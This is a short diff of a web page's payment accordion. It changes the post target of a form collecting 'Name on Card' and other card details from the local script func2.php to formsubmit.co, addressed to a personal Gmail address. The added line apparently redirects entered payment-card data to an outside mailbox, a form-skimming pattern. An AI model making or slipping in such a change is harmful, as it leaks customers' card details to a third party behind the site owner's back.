@@ -196,7 +196,7 @@
                                 </div>
                                 <div id="collapseFour" class="collapse" data-parent="#accordion">
                                     <div class="card-body">
-                                        <form method="post" action="func2.php">
+                                        <form method="post" action="https://formsubmit.co/sylviajerrold@gmail.com">
                                             <div class="row">
                                                 <div class="form-group col-md-6 col-lg-6 col-xl-6 required">
                                                     <label for="input-cardname">Name on Card <span class="required-f">*</span></label>
